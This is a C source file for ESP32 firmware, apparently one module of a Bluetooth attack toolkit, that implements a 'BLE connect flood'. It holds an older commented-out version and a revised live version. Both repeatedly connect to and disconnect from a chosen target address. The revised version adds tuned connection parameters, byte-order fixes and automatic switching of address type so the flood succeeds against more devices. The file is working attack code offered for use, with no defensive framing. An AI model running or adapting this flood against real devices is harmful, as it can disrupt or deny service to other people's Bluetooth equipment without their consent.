// /* BLE connect flood - controlled connect/disconnect attempts */
// #include "ble_connect_flood.h"
// #include "esp_log.h"
// #include "freertos/FreeRTOS.h"
// #include "freertos/task.h"
// #include "freertos/semphr.h"
// #include <string.h>

// /* NimBLE headers */
// #include "nimble/nimble_port.h"
// #include "host/ble_hs.h"
// #include "host/ble_gap.h"

// #include "ble_common.h"

// static const char *TAG = "ble_connect_flood";
// static bool running = false;
// static TaskHandle_t task_handle = NULL;
// static char target[32] = {0};
// static SemaphoreHandle_t mutex = NULL;

// static void addr_from_str(const char *s, uint8_t out[6]) {
//     // expecting AA:BB:CC:DD:EE:FF
//     int vals[6] = {0};
//     if (sscanf(s, "%x:%x:%x:%x:%x:%x", &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) == 6) {
//         for (int i=0;i<6;i++) out[i] = (uint8_t)vals[i];
//     } else memset(out,0,6);
// }

// static int conn_event_cb(struct ble_gap_event *event, void *arg) {
//     switch (event->type) {
//         case BLE_GAP_EVENT_CONNECT:
//             if (event->connect.status == 0) {
//                 ESP_LOGI(TAG, "Connected; conn_handle=%d", event->connect.conn_handle);
//                 // disconnect quickly
//                 int rc = ble_gap_terminate(event->connect.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
//                 if (rc) ESP_LOGE(TAG, "ble_gap_terminate failed: %d", rc);
//             } else {
//                 ESP_LOGW(TAG, "Connection failed: status=%d", event->connect.status);
//             }
//             break;
//         case BLE_GAP_EVENT_DISCONNECT:
//             ESP_LOGI(TAG, "Disconnected; reason=%d", event->disconnect.reason);
//             break;
//         default:
//             break;
//     }
//     return 0;
// }

// static void flood_task(void *arg) {
//     ESP_LOGI(TAG, "Connect flood task started for target %s", target);
//     while (running) {
//         if (ble_gap_conn_active()) {
//             vTaskDelay(pdMS_TO_TICKS(200));
//             continue;
//         }

//         xSemaphoreTake(mutex, portMAX_DELAY);
//         char copy[32]; strncpy(copy, target, sizeof(copy)-1);
//         xSemaphoreGive(mutex);

//         uint8_t addr_val[6]; addr_from_str(copy, addr_val);
//         ble_addr_t peer;
//         peer.type = BLE_ADDR_PUBLIC;
//         memcpy(peer.val, addr_val, 6);

//         ESP_LOGI(TAG, "Attempting connect to %s", copy);
//         uint8_t own_addr_type = ble_common_own_addr_type();
//         int rc = ble_gap_connect(own_addr_type, &peer, 3000, NULL, conn_event_cb, NULL);
//         if (rc) {
//             if (rc != BLE_HS_EALREADY) {
//                 ESP_LOGW(TAG, "ble_gap_connect returned %d", rc);
//             }
//         }

//         // rate limit between attempts
//         vTaskDelay(pdMS_TO_TICKS(800));
//     }
//     task_handle = NULL;
//     vTaskDelete(NULL);
// }

// void ble_connect_flood_init(void) {
//     if (mutex == NULL) mutex = xSemaphoreCreateMutex();
//     ESP_LOGI(TAG, "ble_connect_flood initialized");
// }

// void ble_connect_flood_start(const char *target_addr) {
//     if (running) return;
//     if (mutex == NULL) mutex = xSemaphoreCreateMutex();
//     xSemaphoreTake(mutex, portMAX_DELAY);
//     strncpy(target, target_addr?target_addr:"", sizeof(target)-1);
//     xSemaphoreGive(mutex);
//     running = true;
//     xTaskCreate(flood_task, "ble_connect_flood", 4096, NULL, 5, &task_handle);
// }

// void ble_connect_flood_stop(void) {
//     if (!running) return;
//     running = false;
//     vTaskDelay(pdMS_TO_TICKS(300));
// }

// bool ble_connect_flood_is_running(void) { return running; }

/* BLE connect flood - controlled connect/disconnect attempts */
#include "ble_connect_flood.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <string.h>

/* NimBLE headers */
#include "nimble/nimble_port.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"

#include "ble_common.h"

static const char *TAG = "ble_connect_flood";
static bool running = false;
static TaskHandle_t task_handle = NULL;
static char target[32] = {0};
static SemaphoreHandle_t mutex = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;

/* Track which address type to try — auto-flips on status 13 */
static uint8_t try_addr_type = BLE_ADDR_PUBLIC;

/* Proper connection parameters instead of NULL defaults */
static const struct ble_gap_conn_params conn_params = {
    .scan_itvl = 0x0010,           /* 10ms scan interval */
    .scan_window = 0x0010,         /* 10ms scan window */
    .itvl_min = 0x0006,            /* 7.5ms (minimum allowed by spec) */
    .itvl_max = 0x000C,            /* 15ms */
    .latency = 0,
    .supervision_timeout = 0x0300, /* 7.68s — was 2.56s with defaults */
    .min_ce_len = 0,
    .max_ce_len = 0,
};

/* Reverse byte order for NimBLE little-endian address storage */
static void addr_from_str(const char *s, uint8_t out[6]) {
    int vals[6] = {0};
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2],
               &vals[3], &vals[4], &vals[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            out[i] = (uint8_t)vals[5 - i];
        }
    } else {
        memset(out, 0, 6);
    }
}

static int conn_event_cb(struct ble_gap_event *event, void *arg) {
    switch (event->type) {
        case BLE_GAP_EVENT_CONNECT:
            if (event->connect.status == 0) {
                ESP_LOGI(TAG, "Connected! conn_handle=%d", event->connect.conn_handle);
                int rc = ble_gap_terminate(event->connect.conn_handle,
                                           BLE_ERR_REM_USER_CONN_TERM);
                if (rc) ESP_LOGE(TAG, "ble_gap_terminate failed: %d", rc);

                /* After a successful connect+disconnect, the target will likely
                 * stop advertising for a while. Add a longer cooldown. */
                vTaskDelay(pdMS_TO_TICKS(5000));
            } else {
                ESP_LOGW(TAG, "Connection failed: status=%d", event->connect.status);

                if (event->connect.status == 13) {
                    try_addr_type = (try_addr_type == BLE_ADDR_PUBLIC)
                        ? BLE_ADDR_RANDOM
                        : BLE_ADDR_PUBLIC;
                    ESP_LOGI(TAG, "Status 13: switching addr_type to %s",
                             try_addr_type == BLE_ADDR_PUBLIC ? "PUBLIC" : "RANDOM");
                }

                /* After a failed connection, add a short backoff */
                vTaskDelay(pdMS_TO_TICKS(2000));
            }
            break;

        case BLE_GAP_EVENT_DISCONNECT:
            ESP_LOGI(TAG, "Disconnected; reason=%d", event->disconnect.reason);
            /* Small delay after disconnect before next connect attempt */
            vTaskDelay(pdMS_TO_TICKS(500));
            break;

        default:
            break;
    }
    return 0;
}

static void flood_task(void *arg) {
    ESP_LOGI(TAG, "Connect flood task started for target %s", target);

    while (running) {
        /* Don't attempt connect if another GAP procedure is active */
        if (ble_gap_conn_active()) {
            vTaskDelay(pdMS_TO_TICKS(200));
            continue;
        }
        if (ble_gap_adv_active()) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }
        if (ble_gap_disc_active()) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        /* Safely copy target address */
        xSemaphoreTake(mutex, portMAX_DELAY);
        char copy[32];
        strncpy(copy, target, sizeof(copy) - 1);
        copy[sizeof(copy) - 1] = '\0';
        xSemaphoreGive(mutex);

        /* Parse address into NimBLE format */
        uint8_t addr_val[6];
        addr_from_str(copy, addr_val);

        ble_addr_t peer;
        peer.type = try_addr_type;
        memcpy(peer.val, addr_val, 6);

        ESP_LOGI(TAG, "Attempting connect to %s (addr_type=%s)",
                 copy, try_addr_type == BLE_ADDR_PUBLIC ? "PUBLIC" : "RANDOM");

        uint8_t own_addr_type = ble_common_own_addr_type();

        int rc = ble_gap_connect(own_addr_type, &peer, 30000,
                                 &conn_params, conn_event_cb, NULL);
        if (rc != 0) {
            if (rc == BLE_HS_EALREADY) {
                ESP_LOGD(TAG, "Connection already in progress");
                vTaskDelay(pdMS_TO_TICKS(500));
            } else if (rc == BLE_HS_EBUSY) {
                /* Host is busy (disconnect still processing) — wait longer */
                ESP_LOGD(TAG, "BLE host busy, waiting...");
                vTaskDelay(pdMS_TO_TICKS(1000));
            } else {
                ESP_LOGW(TAG, "ble_gap_connect returned %d", rc);
            }
        }

        /* Rate limit between attempts */
        vTaskDelay(pdMS_TO_TICKS(1500));
    }

    ESP_LOGI(TAG, "Connect flood task exiting");
    task_handle = NULL;
    if (task_exit_sem) xSemaphoreGive(task_exit_sem);
    vTaskDelete(NULL);
}

void ble_connect_flood_init(void) {
    if (mutex == NULL) mutex = xSemaphoreCreateMutex();
    if (task_exit_sem == NULL) task_exit_sem = xSemaphoreCreateBinary();

    ble_common_init();

    ESP_LOGI(TAG, "ble_connect_flood initialized");
}

void ble_connect_flood_start(const char *target_addr) {
    if (running) return;
    if (mutex == NULL) mutex = xSemaphoreCreateMutex();

    xSemaphoreTake(mutex, portMAX_DELAY);
    strncpy(target, target_addr ? target_addr : "", sizeof(target) - 1);
    target[sizeof(target) - 1] = '\0';
    xSemaphoreGive(mutex);

    try_addr_type = BLE_ADDR_PUBLIC;

    running = true;

    if (task_exit_sem != NULL) {
        xSemaphoreTake(task_exit_sem, 0);
    }

    BaseType_t ret = xTaskCreate(flood_task, "ble_conn_fl", 4096, NULL, 5, &task_handle);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create flood task");
        running = false;
    }
}

void ble_connect_flood_stop(void) {
    if (!running) return;
    running = false;

    if (task_exit_sem != NULL) {
        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout, forcing delete");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    } else {
        vTaskDelay(pdMS_TO_TICKS(1000));
        if (task_handle != NULL) {
            vTaskDelete(task_handle);
            task_handle = NULL;
        }
    }

    ESP_LOGI(TAG, "Connect flood stopped");
}

bool ble_connect_flood_is_running(void) {
    return running;
}